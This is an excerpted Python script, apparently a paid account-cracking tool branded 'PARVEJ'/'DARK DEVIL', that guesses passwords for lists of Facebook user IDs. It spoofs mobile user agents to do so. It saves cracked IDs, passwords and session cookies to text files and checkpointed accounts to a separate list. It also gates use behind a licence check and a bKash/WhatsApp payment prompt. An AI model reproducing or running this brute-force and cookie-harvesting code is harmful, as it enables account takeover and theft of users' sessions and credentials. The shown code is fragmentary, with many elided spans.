...
for xd in range(10000):
    ...
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaPARVEJ/MiuiBrowser/12.22.0.3-gn'
...
┃\033[1;96mALL HETTERS YOUR PAPA DEVIL PARVEJ is back 
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ━━━━━━━━━━━━━━━━━ DARK DEVIL ━━━━━━━━━━━
               \033[1;92mCREATED BY   :  PARVEJ       
               \033[1;92mFACEBOK      :  MOHAMMED PARVEJ 
               \033[1;92mGITHUB       :  PARVEJ-PS     
               \033[1;92mSTATUS       :   PAID😴            
               \033[1;92mTEAM         :  EXPERT COURSE           
               \033[1;92mTOOL VIRSION :  4.5                  
               \033[1;92mTOOL WORK    :    DATA+WIFI     
     ━━━━━━━━━━━━━━━━━ PARVEJ━━━━━━━━━━━━━━━━━
""")
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/PARVEJ-PS/Paid-Test/blob/main/Appval.txt').text
    if id in httpCaht:
      ...
      print('BKASH PERSONAL - +8801961049607')
      print('Send Pay And Give Ss And Send Me Key Or Ss Me Whatsapp')
      print('\33[1;37m----------------------------------------------')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801961049607?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://youtube.com/@mr.black.devil.')
		crack_file()
		
	if ot == '2':
		os.system('xdg-open https://www.facebook.com/Anuvuti.69')
		rndm()
...
def random_header():
    devices = ["iPhone", "Samsung", "Nexus", "Pixel", "iPad", "Surface", "Kindle"]
    browsers = ["ChrPARVEJum", "Not=A?Brand"]
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[PARVEJ_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mPARVEJ-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('PARVEJ-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('PARVEJ-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(PARVEJ-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
